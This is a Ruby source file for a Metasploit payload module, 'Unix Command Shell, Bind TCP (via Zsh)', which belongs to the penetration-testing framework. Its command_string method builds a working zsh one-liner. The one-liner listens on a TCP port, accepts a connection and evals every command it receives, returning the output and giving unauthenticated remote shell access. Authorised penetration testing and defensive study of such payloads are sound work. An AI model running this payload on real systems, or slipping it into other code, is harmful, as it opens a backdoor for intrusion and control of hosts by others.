##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit4

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Unix Command Shell, Bind TCP (via Zsh)',
      'Description'   => %q{
        Listen for a connection and spawn a command shell via Zsh. Note: Although Zsh is
        often available, please be aware it isn't usually installed by default.
      },
      'Author'        =>
        [
          'Doug Prostko <dougtko[at]gmail.com>'
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'unix',
      'Arch'          => ARCH_CMD,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
      'RequiredCmd'   => 'zsh',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    cmd = "zmodload zsh/net/tcp;"
    cmd << "ztcp -l #{datastore['LPORT']};"
    cmd << "ztcp -a $REPLY;"
    cmd << "while read -r cmd <&$REPLY;do eval ${cmd} >&$REPLY;done;"
    cmd << "ztcp -c"
    cmd
  end
end
